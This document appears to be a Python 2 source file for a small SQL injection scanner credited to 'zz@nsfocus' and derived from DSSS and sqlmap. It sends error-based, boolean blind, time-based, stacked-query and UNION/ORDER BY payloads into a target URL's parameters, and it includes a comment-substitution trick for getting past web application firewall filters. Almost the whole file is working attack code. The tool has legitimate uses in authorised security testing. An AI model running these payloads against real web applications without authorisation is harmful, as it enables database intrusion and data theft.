#!/usr/bin/env python

# add time, union test, stack query  dectection by zz@nsfocus
# use order by technique in union test

# some code copy from sqlmap 1.0 dev
# orginal program framework from DSSS

# small and full functional sql injection detection
# test on python Python 2.7.2+ ubuntu platform

# error code from https://github.com/Zapotek/arachni/blob/master/modules/audit/sqli/regexp_ids.txt
# blind time payload from https://github.com/Zapotek/arachni/blob/master/modules/audit/sqli_blind_timing/payloads.txt
# blind sqli payloads from wapiti, some error message from wapiti

# improvment:
#   1) union order by, do order by test in no error page, reduce false positive
#   2) add some code in union cmp to do better
#   3) balance single quote etc.
#   4) when a blind time sql injection detection, make sure the url is alive and 
#      the effects of the timing attack to wear off
#   5) more acuracy on bool blind sqli detection

# Todo:
# cookie sql injection, referer sql injection
# url parse, oracle union sqli detection, add from dual
# add oracle union test support

# update
# 2011-12-15 
#    update balance `(6=6' to combine with `)'

import difflib, httplib, itertools, optparse, random, re, urllib2, urlparse
import logging, time, urllib, threading
from math import sqrt
from pprint import pprint

NAME    = "small SQLi Scanner"
VERSION = "1.0"
AUTHOR  = "zz@nsfocus"

INVALID_SQL_CHAR_POOL = ('(', ')', '\'', '"', '`')      # characters used for SQL poisoning of parameter values
PREFIXES = (" ", "' ", ") ", "') ", "\" " )             # prefix values used for building testing blind payloads
SUFFIXES = ("", "-- ", "#")                             # suffix values used for building testing blind payloads
BALANCES = ("", " AND 'A'='A", " (6=6",  " AND ('A'='A", " AND \"A\"=\"A")  # balance single quote and double quote
BOOLEAN_TESTS = ("AND %d=%d", "OR NOT (%d=%d)")         # boolean tests used for building testing blind payloads
COOKIE, UA, REFERER = "Cookie", "User-Agent", "Referer" # optional HTTP header names
GET, POST = "GET", "POST"                               # enumerator-like values used for marking current phase
TEXT, HTTPCODE, TITLE, HTML = range(4)                  # enumerator-like values used for marking content type
MIN_BOOL_VAL, MAX_BOOL_VAL = 100, 255                   # minimum and maximum random range values used in boolean tests
FUZZY_THRESHOLD = 0.98                                  # ratio value in range (0,1) used for distinguishing True from False responses
TIME_TESTS = ("OR SLEEP(5)", "AND SLEEP(5)", 
              "OR PG_SLEEP(5)", "AND PG_SLEEP(5)",
              "OR WAITFOR DELAY '0:0:5'", "OR BENCHMARK(10000000,MD5(1))")  # time bind sql injection
STACK_TESTS = ("; SELECT SLEEP(5);", "; SELECT PG_SLEEP(5);",
               "; SELECT WAITFOR DELAY '0:0:5';",
               "; SELECT BENCHMARK(10000000,MD5(1));")  # stacked query tests
ORDER_BY_TESTS = ("ORDER BY 1", "ORDER BY 1000")        # order by tests

DBMS_ERRORS = {
    "MySQL": (r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result", r"MySqlClient\.", 
              r"supplied argument is not a valid MySQL", r"You have an error in your SQL syntax"),
    "PostgreSQL": (r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid PostgreSQL result", r"Npgsql\."),
    "Microsoft SQL Server": (r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server", r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_.*", r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}", r"(?s)Exception.*\WSystem\.Data\.SqlClient\.", r"(?s)Exception.*\WRoadhouse\.Cms\."),
    "Microsoft Access": (r"Microsoft Access Driver", r"JET Database Engine", r"Access Database Engine"),
    "Oracle": (r"ORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Oracle.*Driver", r"Warning.*\Woci_.*", r"Warning.*\Wora_.*"),
    "Runtime Error": (r"System\.Data\.OleDb\.OleDbException", r"java\.sql\.SQLException")
}

MIN_TIME_RESPONSES = 10
TIME_STDEV_COEFF = 10
UNION_STDEV_COEFF = 7
MIN_STATISTICAL_RANGE = 0.05
UNION_COLUMNS = 30                                      # usaualy union injection columns bigger then 20
SQLi = []                                               # store sql injection detection  result
verbose = 0                                             # global verbose level
skill = None                                            # bypass web application firewall filter

_time_all = []                                          # time list
_headers = {}                                           # used for storing dictionary with optional header values

def average(values):
    """
    average of the list's items
    """
    retval = None
    if values:
        retval = sum(values)/len(values)
    return retval


def stdev(values):
    """
    Computes standard deviation of a list of numbers.
    Reference: http://www.goldb.org/corestats.html
    """
    if not values or len(values) < 2:
        return None
    key = (values[0], values[-1], len(values))
    summa = 0.0
    avg = average(values)
    for value in values:
        value = value or 0
        summa += pow(value - avg, 2)
    retVal = sqrt(summa/(len(values) - 1))
    return retVal

def wasLastRequestDelayed(last):
    """
    Returns True if the last web request resulted in a time-delay
    """

    # 99.9999999997440% of all non time-based sql injection affected
    # response times should be inside +-7*stdev([normal response times])
    # Math reference: http://www.answers.com/topic/standard-deviation

    deviation = stdev(_time_all)

    if deviation:
        if len(_time_all) < MIN_TIME_RESPONSES:
            warnMsg = "time-based standard deviation method used on a model "
            warnMsg += "with less than %d response times" % MIN_TIME_RESPONSES
            print warnMsg

        lowerStdLimit = average(_time_all) + TIME_STDEV_COEFF * deviation
        if int(verbose) > 1: print 'last: %f, low:%f' % (last, lowerStdLimit)
        #print _time_all
        retVal = (last >= lowerStdLimit)

        return retVal
    else:
        return (last - 5) >= 0

def orderby_cmp(original, content, ratio):
    _ratio = difflib.SequenceMatcher(None, original[TEXT], content[TEXT]).quick_ratio()
    if _ratio < 0.7 and re.search(r"((warning|error)[^\n]*order)|(order by)", content[TEXT]): return False
    if content[HTTPCODE] != 200: return False
    if int(verbose) > 1: print 'ratio:%f, false ratio:%f' % (_ratio, ratio)
    return all(original[x] == content[x]  for x in (HTTPCODE, TITLE)) and _ratio > ratio

def orderby_test(prefix, suffix, match, current, url, data, phase, col, ratio, original):
    template = "%sORDER BY %d%s" % (prefix, col, suffix)
    payload = current.replace(match.group(0), "%s%s" % (match.group(0), template))
    content = retrieve_content(payload, data) if phase is GET else retrieve_content(url, payload)
    return orderby_cmp(original, content, ratio)

def union_cmp(original, items, ratios):
    max_ratio, min_ratio = ratios[0], ratios[0]
    retval = 0

    for ratio in ratios:
        max_ratio = ratio if ratio > max_ratio else max_ratio
    for ratio in ratios:
        min_ratio = ratio if ratio < min_ratio else min_ratio

    for item in items:
        if item[1] == min_ratio:
            minItem = item
        elif item[1] == max_ratio:
            maxItem = item

    print 'min_ratio ', min_ratio, 'max_ratio ', max_ratio
    if int(verbose) > 1: pprint (ratios)

    ratios.pop(ratios.index(min_ratio))
    ratios.pop(ratios.index(max_ratio))

    if all(map(lambda x: x == min_ratio and x != max_ratio, ratios)):
        retval = maxItem[0]
    elif all(map(lambda x: x != min_ratio and x == max_ratio, ratios)):
        retval = minItem[0]
    elif abs(max_ratio - min_ratio) >= MIN_STATISTICAL_RANGE:
        deviation = stdev(ratios)
        lower, upper = average(ratios) - UNION_STDEV_COEFF * deviation, average(ratios) + UNION_STDEV_COEFF * deviation

        if min_ratio < lower:
            retval = minItem[0]

        if max_ratio > upper:
            if retval is None or abs(max_ratio - upper) > abs(min_ratio - lower):
                retval = maxItem[0]

    if retval:
        ritem = items[retval-1]
        if ritem[2][HTTPCODE] is not 200 and re.search(r"warning|error", ritem[2][TEXT]): return 0
        if (original[HTTPCODE] != ritem[2][HTTPCODE]): return 0

    return retval

def union_verify(prefix, suffix, match, current, url, data, phase, col, original):
    """
        test columns printable
    """
    pass

def union_test(prefix, suffix, match, current, url, data, phase, maxcol, original):
    """
        brute force union injection columns
    """
    ratios = []
    items = []
    for count in range(1, maxcol+1):
        position = 1
        union_clause = "UNION ALL SELECT "
        while position <= count:
            union_clause += "NULL,"  # use NULL to match any data type
            position += 1
        balance = BALANCES[PREFIXES.index(prefix)]
        template = "%s%s%s%s" % (prefix, union_clause.rstrip(','), suffix, balance)
        payload = current.replace(match.group(0), "%s%s" % (match.group(0), template))
        #payload = payload.replace(match.group("value"), "-"+ match.group("value"), 1)
        content = retrieve_content(payload, data) if phase is GET else retrieve_content(url, payload)
        _ratio = difflib.SequenceMatcher(None, original[TEXT], content[TEXT]).quick_ratio()
        ratios.append(_ratio)
        items.append((count, _ratio, content, payload))

    found = union_cmp(original, items, ratios)
    if found: payload = items[found-1][3]
    return  (found, payload) if found else (None, None)

def check_dynparam():
    """
        check if the parameter, add some code here
    """
    pass


def retrieve_content(url, data=None):
    """
        retrieve page content
    """
    retval = {HTTPCODE: httplib.OK}
    #url = "".join(url[i].replace(' ', '%20') if i > url.find('?') else url[i] for i in xrange(len(url)))
    url = "".join(urllib.quote(url[i], safe='=&,:/') if i > url.find('?') else url[i] for i in xrange(len(url)))
    if skill == '1': url = url.replace('%20', '/**/')

    if data:
        data = "".join(urllib.quote(data[i], safe='=&,/') for i in xrange(len(data)))
    if verbose: print "testing `%s', %s" % (url, data)
    start = time.time()
    try:
        req = urllib2.Request(url, data, _headers)
        retval[HTML] = urllib2.urlopen(req).read()
    except Exception, ex:
        retval[HTTPCODE] = getattr(ex, "code", None)
        retval[HTML] = ex.read() if hasattr(ex, "read") else getattr(ex, "msg", str())
    _time_all.append(time.time() - start)
    #print _time_all
    match = re.search(r"<title>(?P<result>[^<]+)</title>", retval[HTML], re.I)
    retval[TITLE] = match.group("result") if match and "result" in match.groupdict() else None
    retval[TEXT] = re.sub(r"(?si)<script.+?</script>|<!--.+?-->|<style.+?</style>|<[^>]+>|\s+", " ", retval[HTML])
    if int(verbose) > 2: print retval[TEXT]
    return retval

def scan_page(url, classify, data=None):
    retval, usable = False, False
    try:
        for phase in (GET, POST):
            current = url if phase is GET else (data or "")
            for match in re.finditer(r"((\A|[?&])(?P<parameter>\w+)=)(?P<value>[^&]+)", current):
                vulnerable, usable = False, True
                print "* scanning %s parameter '%s'" % (phase, match.group("parameter"))
                # error test
                vulnerable = False if classify == 'all' or 'E' in classify else True
                if not vulnerable:
                    tampered = current.replace(match.group(0), "%s%s" % (match.group(0), \
                                    "".join(random.sample(INVALID_SQL_CHAR_POOL, len(INVALID_SQL_CHAR_POOL)))))
                    content = retrieve_content(tampered, data) if phase is GET else retrieve_content(url, tampered)
                    for dbms in DBMS_ERRORS:
                        for regex in DBMS_ERRORS[dbms]:
                            if not vulnerable and re.search(regex, content[HTML], re.I):
                                print " (i) %s parameter '%s' could be error SQLi vulnerable (%s)" % (phase, match.group("parameter"), dbms)
                                print " (i) match regexp: %s" % regex
                                retval = vulnerable = True
                                SQLi.append(tampered) if phase is GET else SQLi.append("%s, %s" % (url, tampered))
                vulnerable = False if classify is 'all' or 'B' in classify else True
                original = retrieve_content(current, data) if phase is GET else retrieve_content(url, current)
                left, right = random.sample(xrange(MIN_BOOL_VAL, MAX_BOOL_VAL + 1), 2)
                # boolean test
                for prefix, boolean, suffix in itertools.product(PREFIXES, BOOLEAN_TESTS, SUFFIXES):
                    if not vulnerable:
                        balance = BALANCES[PREFIXES.index(prefix)]
                        template = "%s%s%s%s" % (prefix, boolean, suffix, balance)
                        payloads = dict((x, current.replace(match.group(0), "%s%s" % (match.group(0), (template % (left, left if x else right))))) for x in (True, False))
                        contents = dict((x, retrieve_content(payloads[x], data) if phase is GET else retrieve_content(url, payloads[x])) for x in (True, False))
                        if any(original[x] == contents[True][x] != contents[False][x] for x in (HTTPCODE, TITLE)) or len(original[TEXT]) == len(contents[True][TEXT]) != len(contents[False][TEXT]):
                            vulnerable = True
                        else:
                            ratios = dict((x, difflib.SequenceMatcher(None, original[TEXT], contents[x][TEXT]).quick_ratio()) for x in (True, False))
                            vulnerable = ratios[True] > FUZZY_THRESHOLD and ratios[False] < FUZZY_THRESHOLD and (ratios[True] - ratios[False]) > 0.05
                        if vulnerable:
                            print " (i) %s parameter '%s' appears to be blind SQLi vulnerable" % (phase, match.group("parameter"))
                            SQLi.append(payloads[True]) if phase is GET else SQLi.append("%s, %s" % (url, payloads[True]))
                            retval = True
                # add time test
                vulnerable = False if classify == 'all' or 'T' in classify else True
                for prefix, delay, suffix in itertools.product(PREFIXES, TIME_TESTS, SUFFIXES):
                    if not vulnerable:
                        balance = BALANCES[PREFIXES.index(prefix)]
                        template = "%s%s%s%s" % (prefix, delay, suffix, balance)
                        tampered = current.replace(match.group(0), "%s%s" % (match.group(0), template))
                        content = retrieve_content(tampered, data) if phase is GET else retrieve_content(url, tampered)
                        last = _time_all.pop()
                        vulnerable = wasLastRequestDelayed(last)
                        if vulnerable:
                            content = retrieve_content(tampered, data) if phase is GET else retrieve_content(url, tampered)
                            last = _time_all.pop()
                            vulnerable = wasLastRequestDelayed(last)
                            if vulnerable:
                                retval = True
                            else:
                                _time_all.append(last)
                        else:
                            _time_all.append(last)
                        if vulnerable:
                            SQLi.append(tampered) if phase is GET else SQLi.append("%s, %s" % (url, tampered))
                            print " (i) %s parameter '%s' appears to be time blind SQLi vulnerable" % (phase, match.group("parameter"))
                            retval = True
                # add stack query injection
                vulnerable = False if classify == 'all' or 'S' in classify else True
                for prefix, stack, suffix in itertools.product(PREFIXES, STACK_TESTS, SUFFIXES):
                    if not vulnerable:
                        balance = BALANCES[PREFIXES.index(prefix)]
                        template = "%s%s%s%s" % (prefix, stack, suffix, balance)
                        tampered = current.replace(match.group(0), "%s%s" % (match.group(0), template))
                        content = retrieve_content(tampered, data) if phase is GET else retrieve_content(url, tampered)
                        last = _time_all.pop()
                        vulnerable = wasLastRequestDelayed(last)
                        if vulnerable:
                            content = retrieve_content(tampered, data) if phase is GET else retrieve_content(url, tampered)
                            last = _time_all.pop()
                            vulnerable = wasLastRequestDelayed(last)
                            if vulnerable:
                                retval = True
                            else:
                                _time_all.append(last)
                        else:
                            _time_all.append(last)
                        if vulnerable:
                            SQLi.append(tampered) if phase is GET else SQLi.append("%s, %s" % (url, tampered))
                            print " (i) %s parameter '%s' appears to be stack query SQLi vulnerable" % (phase, match.group("parameter"))
                            retval = True
                # add union test
                vulnerable = False if classify == 'all' or 'U' in classify else True
                found = None
                for prefix, suffix in itertools.product(PREFIXES, SUFFIXES):
                    if not vulnerable:
                        orderby = False
                        found = None 
                        template = dict((x, "%sORDER BY 1%s" % (prefix, suffix) if x else "%sORDER BY 100%s" % (prefix, suffix)) for x in (True, False))
                        payloads = dict((x, current.replace(match.group(0), "%s%s" % (match.group(0), template[True] if x else template[False]))) for x in (True, False))
                        contents = dict((x, retrieve_content(payloads[x], data) if phase is GET else retrieve_content(url, payloads[x])) for x in (True, False))
                        if any(original[x] == contents[True][x] != contents[False][x] for x in (HTTPCODE, TITLE)) or len(original[TEXT]) == len(contents[True][TEXT]) != len(contents[False][TEXT]):
                            orderby = True
                            _ratio = difflib.SequenceMatcher(None, original[TEXT], contents[False][TEXT]).quick_ratio()
                            print " (i) %s parameter '%s' seems to be ORDER BY union SQLi injection." % (phase, match.group("parameter"))
                        low, high = 1, 10
                        if orderby:
                            while not found:
                                while high > 100: break
                                if orderby_test(prefix, suffix, match, current, url, data, phase, high, _ratio, original):
                                    low = high
                                    high += 10
                                else:
                                    while not found:
                                        mid = high - (high - low) / 2
                                        if orderby_test(prefix, suffix, match, current, url, data, phase, mid, _ratio, original):
                                            low = mid
                                        else:
                                            high = mid
                                        if (high - low) < 2:
                                            found = low
                            if found > 1 and found < 100:
                                print " (i) %s parameter '%s' seems to be ORDER BY %d columns union injection." % (phase, match.group("parameter"), found)
                                SQLi.append(payloads[True]) if phase is GET else SQLi.append('%s, %s' % (url, payloads[True]))
                                #vulnerable = True
                                retval = True
                        found, payload = union_test(prefix, suffix, match, current, url, data, phase, UNION_COLUMNS, original)
                        if found:
                            print " (i) %s parameter '%s' seems to be %d columns union SQLi injection." % (phase, match.group("parameter"), found)
                            SQLi.append(payload) if phase is GET else SQLi.append('%s, %s' % (url, payload))
                            vulnerable = True
                            retval = True
        if not usable:
            print " (x) no usable GET/POST parameters found"
    except KeyboardInterrupt:
        print "\r (x) Ctrl-C pressed"
    if retval: pprint( SQLi )
    return retval

def init_options(proxy=None, cookie=None, ua=None, referer=None):
    if proxy:
        urllib2.install_opener(urllib2.build_opener(urllib2.ProxyHandler({'http': proxy})))
    _headers.update(dict(filter(lambda item: item[1], [(COOKIE, cookie), (UA, ua), (REFERER, referer)])))

if __name__ == "__main__":
    print "%s #v%s\n by: %s\n" % (NAME, VERSION, AUTHOR)
    parser = optparse.OptionParser(version=VERSION)
    parser.add_option("-u", "--url", dest="url", help="Target URL (e.g. \"http://www.target.com/page.htm?id=1\")")
    parser.add_option("--data", dest="data", help="POST data (e.g. \"query=test\")")
    parser.add_option("--cookie", dest="cookie", help="HTTP Cookie header value")
    parser.add_option("--user-agent", dest="ua", help="HTTP User-Agent header value")
    parser.add_option("--referer", dest="referer", help="HTTP Referer header value")
    parser.add_option("--proxy", dest="proxy", help="HTTP proxy address (e.g. \"http://127.0.0.1:8080\")")
    parser.add_option("--classify", dest="classify", default="all", help="SQLi technique, valule: EBTSU (e.g. --technique=U), default is all")
    parser.add_option("-v", dest="verbose", default="0", help="Verbosity level, 0-2, default is 0")
    parser.add_option("-s", dest="skill", default="0", help="Bypass filter, 1-n (1. /**/), default is None")
    options, _ = parser.parse_args()
    verbose = options.verbose
    skill = options.skill
    if options.url:
        init_options(options.proxy, options.cookie, options.ua, options.referer)
        result = scan_page(options.url if options.url.startswith("http") else "http://%s" % options.url, options.classify, options.data)
        print "\nscan results: %s vulnerabilities found" % ("possible" if result else "no")
    else:
        parser.print_help()
